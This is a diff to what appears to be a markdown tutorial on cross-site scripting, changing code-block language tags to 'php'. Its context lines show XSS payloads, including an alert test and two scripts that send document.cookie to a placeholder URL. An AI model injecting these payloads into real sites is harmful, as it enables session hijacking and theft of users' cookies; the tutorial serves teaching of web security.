@@ -38,7 +38,7 @@ https://insecure-website.com/search?name=<script>JS_CODE</script>
 
 You can replace ```JS_CODE``` by anything you want. A basic test could be :
 
-```js
+```php
 <script>alert(1)</script>
 ```
 
@@ -95,13 +95,13 @@ Now that our environment is ready we can send our payload like :
 
 or
 
-```sh
+```php
 <script>document.location="[URL]?"+document.cookie;</script>
 ``` 
 
 or
 
-```sh
+```php
 <script>document.write('<img src="[URL]?'+document.cookie+'"/>');</script>
 ``` 
 
